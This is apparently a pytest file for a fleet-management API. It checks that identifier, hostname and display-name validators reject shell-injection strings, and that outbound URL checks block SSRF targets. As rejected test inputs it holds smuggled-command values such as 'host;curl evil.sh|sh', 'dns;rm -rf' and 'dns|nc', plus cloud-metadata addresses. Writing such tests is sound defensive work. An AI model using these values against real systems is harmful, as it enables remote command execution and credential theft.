"""Defense-in-depth input validation (item #85).

Covers:

  * The pure identifier / hostname / display-name validators in ``access.py``
    (reject shell metacharacters, control chars, over-long labels; accept the
    legitimate spoke ids / hostnames the fleet uses).
  * Route-level enforcement: ``/setup/spoke-name`` and ``/api/generic/provision``
    reject malformed ``spoke_id`` / ``hostname`` / ``module_id`` / ``display_name``
    with HTTP 400 BEFORE the value is stored or relayed to a spoke. The
    security-critical case is ``hostname`` — it is relayed to the spoke's
    ``SPOKE_SET_HOSTNAME``, which applies it via a shell ``hostname <value>``
    call, so a value carrying shell metacharacters is remote command injection
    on the spoke.
"""
import asyncio

import pytest
from fastapi.testclient import TestClient

import api as api_mod
import access as access_mod


# ── Pure-helper unit tests ────────────────────────────────────────────────────

def test_valid_identifier_accepts_legitimate_ids():
    for s in ("dns-spoke-1", "cs_svr_02", "agent.7", "nw-1", "A", "a1", "x" * 64):
        assert access_mod.valid_identifier(s), f"expected valid: {s!r}"


def test_valid_identifier_rejects_bad():
    for s in ("", None, 5, "-dns", ".dns", "dns;rm -rf", "dns $(whoami)",
             "dns\nx", "a b", "x" * 65, "dns/spoke", "dns`id`", "dns|nc",
             "dns&whoami", "dns'cat'", 'dns"hi"', "dns$HOME"):
        assert not access_mod.valid_identifier(s), f"expected INVALID: {s!r}"


def test_valid_hostname_accepts_legitimate():
    for s in ("cs-svr-02", "dns-spoke-1.example.com", "host01", "a", "x" * 63,
              "a.b.c", "h-1.example"):
        assert access_mod.valid_hostname(s), f"expected valid: {s!r}"


def test_valid_hostname_rejects_shell_metachars_and_malformed():
    # The security-critical rejection: shell metacharacters in a hostname that
    # would be relayed to ``hostname <value>`` on the spoke.
    for s in ("cs-svr-02;rm -rf /", "host$(whoami)", "a`id`b", "host|x",
              "host&whoami", "host\nx", "host'cat'", 'h"hi"', "host x",
              "-leading", "trailing-", ".leading", "trailing.", "",
              None, 5, "x" * 254, "a" * 64 + ".example.com",
              "host..double", "host.-bad", "bad-"):
        assert not access_mod.valid_hostname(s), f"expected INVALID: {s!r}"


def test_valid_display_name_accepts_normal_names():
    for s in ("DNS Spoke 1", "CS-Server-02", "Acme Lab", "x" * 128,
              "user@acme", "a/b"):
        assert access_mod.valid_display_name(s), f"expected valid: {s!r}"


def test_valid_display_name_rejects_control_and_shell_chars():
    for s in ("", None, 5, "x" * 129, "a;b", "a|b", "a&b", "a$b", "a`b",
              "a\"b", "a'b", "a<b", "a>b", "a\\b", "a\nb", "a\x00b",
              "a\x1fb", "a\x7fb", "a;b"):
        assert not access_mod.valid_display_name(s), f"expected INVALID: {s!r}"


# ── Route-level enforcement ───────────────────────────────────────────────────

class _FakeState:
    def __init__(self, data_dir, system_state=None):
        self.data_dir = data_dir
        self.system_state = system_state or {}

    def ensure_admin_lockout(self):
        return False

    def save_state(self):
        pass

    def _mark_dirty(self):  # parity with StateManager dirty-flag persistence
        pass

    async def save_state_now(self):
        self.save_state()

    def get_tenant(self, tid):
        return None

    def set_module_name(self, spoke_id, name):
        self.system_state.setdefault("module_names", {})[spoke_id] = name


class _FakeHub:
    def __init__(self, data_dir, known_modules=None, connected=None):
        self.state = _FakeState(data_dir, {"known_modules": known_modules or []})
        self.active_connections = set(connected or [])
        self.simulations_store = type("_Store", (), {})()
        self.simulations_cache = {}
        self.approved_modules = {}
        self.spoke_module_types = {}
        self._spokes_by_type = {}

    def get_spoke_by_type(self, t):
        return self._spokes_by_type.get(t)

    async def send_to_spoke(self, msg):
        return None

    async def request_response(self, spoke_id, cmd, payload, timeout=30.0):
        return {"payload": {"data": {"status": "SUCCESS"}}}


@pytest.fixture(autouse=True)
def _isolate():
    api_mod._sessions.clear()
    yield


def _ensure_loop():
    try:
        asyncio.get_event_loop()
    except RuntimeError:
        asyncio.set_event_loop(asyncio.new_event_loop())


def _build_app(hub):
    _ensure_loop()
    return TestClient(api_mod.create_app(hub))


def _mint_admin(hub):
    user_data = {"user_id": "admin", "auth_type": "local",
                 "permissions": {"role": "admin", "admin": True},
                 "tenants": [], "tenant_id": None, "protected": False}
    return api_mod._record_session(hub, user_data)


def test_rename_spoke_rejects_bad_spoke_id(tmp_path):
    hub = _FakeHub(tmp_path, known_modules=["dns-spoke-1"])
    c = _build_app(hub)
    tok = _mint_admin(hub)
    r = c.post("/setup/spoke-name",
               json={"spoke_id": "dns-spoke-1;rm -rf /", "display_name": "ok"},
               cookies={"lm_session": tok})
    assert r.status_code == 400
    assert "Invalid spoke_id" in r.json()["detail"]


def test_rename_spoke_rejects_shell_in_hostname(tmp_path):
    """The security-critical case: a hostname carrying shell metacharacters
    must be rejected with 400, not relayed to SPOKE_SET_HOSTNAME."""
    hub = _FakeHub(tmp_path, known_modules=["dns-spoke-1"], connected=["dns-spoke-1"])
    c = _build_app(hub)
    tok = _mint_admin(hub)
    r = c.post("/setup/spoke-name",
               json={"spoke_id": "dns-spoke-1", "display_name": "DNS",
                     "hostname": "host;curl evil.sh|sh"},
               cookies={"lm_session": tok})
    assert r.status_code == 400
    assert "Invalid hostname" in r.json()["detail"]


def test_rename_spoke_rejects_bad_display_name(tmp_path):
    hub = _FakeHub(tmp_path, known_modules=["dns-spoke-1"])
    c = _build_app(hub)
    tok = _mint_admin(hub)
    r = c.post("/setup/spoke-name",
               json={"spoke_id": "dns-spoke-1", "display_name": "a;rm -rf /"},
               cookies={"lm_session": tok})
    assert r.status_code == 400
    assert "Invalid display_name" in r.json()["detail"]


def test_rename_spoke_accepts_valid_inputs(tmp_path):
    hub = _FakeHub(tmp_path, known_modules=["dns-spoke-1"], connected=["dns-spoke-1"])
    c = _build_app(hub)
    tok = _mint_admin(hub)
    r = c.post("/setup/spoke-name",
               json={"spoke_id": "dns-spoke-1", "display_name": "DNS Spoke 1",
                     "hostname": "cs-svr-02"},
               cookies={"lm_session": tok})
    assert r.status_code == 200, r.text
    assert r.json()["status"] == "ok"


def test_provision_rejects_bad_agent_id(tmp_path):
    hub = _FakeHub(tmp_path, connected=["agent-1"])
    c = _build_app(hub)
    tok = _mint_admin(hub)
    r = c.post("/api/generic/provision",
               json={"agent_id": "agent-1;id", "module_id": "dns"},
               cookies={"lm_session": tok})
    assert r.status_code == 400
    assert "Invalid agent_id" in r.json()["detail"]


def test_provision_rejects_bad_module_id(tmp_path):
    """module_id is mapped to a role and forwarded to LOAD_ROLE on the agent;
    an arbitrary string would be relayed verbatim. Reject it at the gate."""
    hub = _FakeHub(tmp_path, connected=["agent-1"])
    c = _build_app(hub)
    tok = _mint_admin(hub)
    r = c.post("/api/generic/provision",
               json={"agent_id": "agent-1", "module_id": "dns;rm -rf /"},
               cookies={"lm_session": tok})
    assert r.status_code == 400
    assert "Invalid module_id" in r.json()["detail"]


def test_provision_rejects_bad_spoke_id(tmp_path):
    hub = _FakeHub(tmp_path, connected=["agent-1"])
    c = _build_app(hub)
    tok = _mint_admin(hub)
    r = c.post("/api/generic/provision",
               json={"agent_id": "agent-1", "module_id": "dns",
                     "spoke_id": "x;y"},
               cookies={"lm_session": tok})
    assert r.status_code == 400
    assert "Invalid spoke_id" in r.json()["detail"]


def test_provision_rejects_bad_display_name(tmp_path):
    hub = _FakeHub(tmp_path, connected=["agent-1"])
    c = _build_app(hub)
    tok = _mint_admin(hub)
    r = c.post("/api/generic/provision",
               json={"agent_id": "agent-1", "module_id": "dns",
                     "display_name": "a|b"},
               cookies={"lm_session": tok})
    assert r.status_code == 400
    assert "Invalid display_name" in r.json()["detail"]


# ── SSRF: outbound-URL safety (Aruba Central cluster_url) ─────────────────────

def test_is_internal_ip_ranges():
    internal = ["127.0.0.1", "10.0.0.1", "192.168.1.1", "172.16.0.1",
                "172.31.255.255", "169.254.169.254", "0.0.0.0", "::1",
                "fe80::1", "fc00::1", "fd00::1"]
    for s in internal:
        assert access_mod.is_internal_ip(s), f"expected internal: {s!r}"
    external = ["8.8.8.8", "1.1.1.1", "104.16.1.1", "198.41.0.4"]
    for s in external:
        assert not access_mod.is_internal_ip(s), f"expected external: {s!r}"
    assert not access_mod.is_internal_ip("not-an-ip")


def test_safe_external_url_rejects_internal_and_plain_http():
    bad = [
        "http://api.example.com",            # plain http (creds would leak)
        "https://127.0.0.1",                 # loopback IP literal
        "https://169.254.169.254",           # cloud metadata
        "https://10.0.0.5/oauth2/token",     # private range
        "https://192.168.1.1",              # private range
        "https://localhost",                # internal hostname
        "https://metadata.google.internal", # cloud metadata host
        "https://api.example.local",        # .local suffix
        "ftp://api.example.com",            # non-http scheme
        "not-a-url",
        "",
        None,
        "https://",                          # no host
    ]
    for s in bad:
        assert not access_mod.safe_external_url(s), f"expected REJECT: {s!r}"


def test_safe_external_url_accepts_public_https():
    for s in ["https://api.example.com",
              "https://cluster-1.central.arubanetworks.com",
              "https://api.example.com:443/oauth2/token",
              "https://sso.common.cloud.hpe.com/as/token.oauth2"]:
        assert access_mod.safe_external_url(s), f"expected accept: {s!r}"


def test_safe_external_url_http_allowed_when_not_required():
    # For paths that genuinely allow plain http, the require_https=False flag
    # relaxes the scheme check but still blocks internal hosts.
    assert access_mod.safe_external_url("http://api.example.com", require_https=False)
    assert not access_mod.safe_external_url("http://127.0.0.1", require_https=False)
    assert not access_mod.safe_external_url("http://localhost", require_https=False)


# ── save_central route-level SSRF guard ───────────────────────────────────────

from fastapi import FastAPI  # noqa: E402
from simulations.routes import register_simulations_routes  # noqa: E402


class _CentralStore:
    """In-memory central-config store mirroring the real store's async API."""
    def __init__(self):
        self.configs = {}

    async def set_central_config(self, tenant_id, cfg):
        self.configs[tenant_id] = dict(cfg or {})


class _CentralHub:
    def __init__(self, store):
        self.simulations_store = store
        self.active_connections = set()

        class _state:
            @staticmethod
            def get_tenant(tid):
                return {"name": tid} if tid else None

        self.state = _state

    def get_client_sim_spoke(self, tenant_id):
        return None


class _Holder:
    def __init__(self):
        self.current = None


def _cs_user(tenant):
    return {"user": {"user_id": "u", "auth_type": "local",
                     "permissions": {"cs": True}, "tenants": [tenant],
                     "tenant_id": tenant, "protected": False}}


def _build_sim():
    store = _CentralStore()
    hub = _CentralHub(store)
    holder = _Holder()
    app = FastAPI()
    register_simulations_routes(
        app, hub,
        session_user_fn=lambda req: holder.current,
        resolve_tenant_fn=lambda req: (holder.current or {}).get("user", {}).get("tenant_id"),
        is_admin_fn=access_mod.is_admin,
        check_tenant_access_fn=access_mod.check_tenant_access,
        sessions=None,
        has_cs_access_fn=access_mod.has_cs_access,
        is_tenant_admin_fn=access_mod.is_tenant_admin,
    )
    return TestClient(app), store, holder


def test_save_central_rejects_internal_cluster_url():
    """The genuine non-admin SSRF vector: a cs-righted tenant user points the
    hub's outbound Aruba token exchange at an internal host / cloud-metadata
    endpoint. Must be rejected at the gate, not stored and later POSTed to."""
    c, store, holder = _build_sim()
    holder.current = _cs_user("acme")
    for bad in [
        "http://api.example.com",            # plain http
        "https://127.0.0.1",                  # loopback
        "https://169.254.169.254",            # cloud metadata
        "https://10.0.0.5",                   # private range
        "https://localhost",                 # internal hostname
    ]:
        r = c.post("/sim/api/aggregate/central",
                   json={"hub_central_config": {"cluster_url": bad}})
        assert r.status_code == 400, f"{bad!r} should be 400, got {r.status_code}: {r.text}"
        # And nothing was stored.
        assert "cluster_url" not in store.configs.get("acme", {})


def test_save_central_accepts_public_https():
    c, store, holder = _build_sim()
    holder.current = _cs_user("acme")
    r = c.post("/sim/api/aggregate/central",
               json={"hub_central_config": {
                   "cluster_url": "https://cluster-1.central.arubanetworks.com"}})
    assert r.status_code == 200, r.text
    assert store.configs["acme"]["cluster_url"] == \
        "https://cluster-1.central.arubanetworks.com"